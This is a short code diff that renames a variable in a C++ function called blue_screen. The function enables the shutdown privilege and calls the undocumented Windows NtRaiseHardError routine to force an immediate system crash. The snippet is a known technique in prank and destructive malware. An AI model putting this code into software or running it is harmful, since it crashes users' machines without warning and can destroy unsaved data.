@@ -8,8 +8,9 @@ extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG NumberOfParam
 
 void blue_screen()
 {
-	BOOLEAN bl;
+	BOOLEAN Boolean;
 	ULONG Response;
-	RtlAdjustPrivilege(19, TRUE, FALSE, &bl); // Enable SeShutdownPrivilege
+
+	RtlAdjustPrivilege(19, TRUE, FALSE, &Boolean); // Enable SeShutdownPrivilege
 	NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &Response); // Shutdown
 }
